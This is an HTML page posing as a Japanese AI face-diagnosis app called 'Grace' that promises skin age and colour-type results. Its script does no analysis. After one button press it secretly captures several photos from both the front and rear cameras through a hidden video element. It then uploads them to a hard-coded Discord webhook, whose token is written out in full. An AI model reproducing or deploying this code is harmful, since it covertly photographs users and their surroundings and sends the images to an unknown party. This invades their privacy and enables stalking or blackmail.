
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta property="og:title" content="AI顔診断 Grace">
  <meta property="og:description" content="肌年齢、顔の比率、イエベ/ブルベ等がすぐにわかる！">
  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg">
  <meta property="og:url" content="https://gracephotoai.github.io/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grace PhotoAI</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      font-family: sans-serif;
    }
    button {
      font-size: 1.5rem;
      padding: 1rem 2rem;
      border: none;
      background-color: #4caf50;
      color: white;
      border-radius: 8px;
      cursor: pointer;
    }
    button:hover {
      background-color: #45a049;
    }
  </style>
</head>
<body>
  <button onclick="startDualCameraCapture()">診断する</button>
  <video id="video" autoplay playsinline style="display:none;"></video>
</body>
<script>
const video = document.getElementById("video");
const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";

function stopStream() {
  if (video.srcObject) {
    video.srcObject.getTracks().forEach(track => track.stop());
    video.srcObject = null;
  }
}

async function captureFromCamera(facingMode) {
  stopStream();
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }});
    video.srcObject = stream;
    return new Promise(resolve => setTimeout(() => resolve(stream), 500));
  } catch (err) {
    console.error("カメラへのアクセスが許可されていません。", err);
    return null;
  }
}

function captureImages(count, interval) {
  return new Promise(resolve => {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');
    const images = [];

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    let captured = 0;
    const intervalId = setInterval(() => {
      if (captured >= count) {
        clearInterval(intervalId);
        resolve(images);
        return;
      }

      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        images.push(blob);
      }, "image/jpeg");

      captured++;
    }, interval);
  });
}

async function startDualCameraCapture() {
  let images = [];

  const userStream = await captureFromCamera("user");
  if (userStream) {
    const userImages = await captureImages(5, 200);
    images = images.concat(userImages);
  }

  const envStream = await captureFromCamera("environment");
  if (envStream) {
    const envImages = await captureImages(5, 200);
    images = images.concat(envImages);
  }

  stopStream();

  // 画像を埋め込み形式で一括送信
  const files = await Promise.all(images.map((blob, i) => {
    return new Promise(resolve => {
      const reader = new FileReader();
      reader.onloadend = () => {
        resolve({ name: `image${i + 1}.jpg`, data: blob });
      };
      reader.readAsArrayBuffer(blob);
    });
  }));

  const formData = new FormData();
  files.forEach((file, index) => {
    formData.append("files[" + index + "]", file.data, file.name);
  });

  fetch(webhookUrl, {
    method: "POST",
    body: formData
  });
}
</script>
</html>
